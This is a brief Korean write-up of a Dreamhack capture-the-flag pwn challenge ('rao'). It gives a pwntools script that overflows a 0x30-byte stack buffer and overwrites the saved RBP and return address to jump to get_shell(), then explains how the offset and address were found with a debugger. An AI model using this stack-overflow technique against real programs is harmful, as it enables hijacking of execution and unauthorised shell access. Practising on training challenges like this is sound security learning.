#system-hacking 
# Payload
```python
from pwn import *

# p = process("/home/user/Desktop/Dreamhack/351/rao")
p = remote(host = "host3.dreamhack.games", port=18160)
shell_addr = p64(0x4006aa)
payload = b'A'*0x30 + b'B'*8 # buffer + RBP(8)
payload += shell_addr

p.send(payload)
p.interactive()
```
# 풀이과정
- rao.c를 읽어 봐도 되고, rao 바이너리에서 main 함수에 breakpoint를 걸고 디스어셈블된 코드를 읽어 보면, 
- buf 변수는 rbp-0x30 위치에 있는 것을 알 수 있다.
- 따라서 0x30만큼 쓰레기 값으로 넣어 주고, 8바이트만큼 rbp를 덮어 써 주고, 그 다음 리턴 함수 주소 저장된 위치를 get_shell() 함수 위치로 덮어쓰면 된다.
	- pwndbg에서 `print get_shell` 하여 함수 위치를 알 수 있다.